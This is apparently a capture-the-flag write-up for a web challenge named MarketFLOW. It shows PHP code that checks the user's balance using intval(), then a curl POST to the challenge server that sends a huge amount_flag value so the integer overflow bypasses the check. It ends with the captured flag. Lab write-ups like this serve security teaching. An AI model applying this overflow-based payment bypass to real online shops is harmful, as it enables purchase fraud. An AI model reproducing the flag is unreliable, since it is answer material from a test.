# Challenge Name: MarketFLOW


![date](https://img.shields.io/badge/date-06.03.2022-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-20-blue.svg)  


## Description

You have a marketplace, your goal is to buy the flag from the platform, but you have only 100 MAD …

Can you find a solution to buy the flag?

> Code
```php
 if($balance  <= intval($amount_token*$price_per_token + $amount_flag*$price_per_flag))
    {
        die("You don't have the balance");    
    }
    else if($amount_flag >1) echo "The flag is : ".$FLAG;
```
> 
> **Hint :** The Architecture of the WebServer is x64

http://3.8.146.134

## Detailed solution

Start by opening the web page http://3.8.146.134

![image](https://user-images.githubusercontent.com/72421091/157159895-0a091c7a-c5a3-4dc7-8ce1-08aea87c928c.png)

We need 150 to buy the flag but our blance is only 100

From challenge name and hint we need to overflow the variable amount_flag

64bit integer has a maximum value of 9,223,372,036,854,775,807 or double for unsigned

https://developers.google.com/discovery/v1/type-format

![image](https://user-images.githubusercontent.com/72421091/157160293-c3b86e05-dbf9-4de6-8b27-3401d710d0be.png)

We can send a huge number to break the intval function

```bash
curl 'http://3.8.146.134/' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://3.8.146.134' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://3.8.146.134/' \
  -H 'Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7' \
  --data-raw 'amount_token=0&amount_flag=111111111111111111111111111111111111111111111111111111111' \
  --compressed \
  --insecure
```

![image](https://user-images.githubusercontent.com/72421091/157160986-c74d7a4a-9199-4abe-89eb-398a767624c5.png)

## Flag

```
CRISIS{xcRAZjkJp2}
```

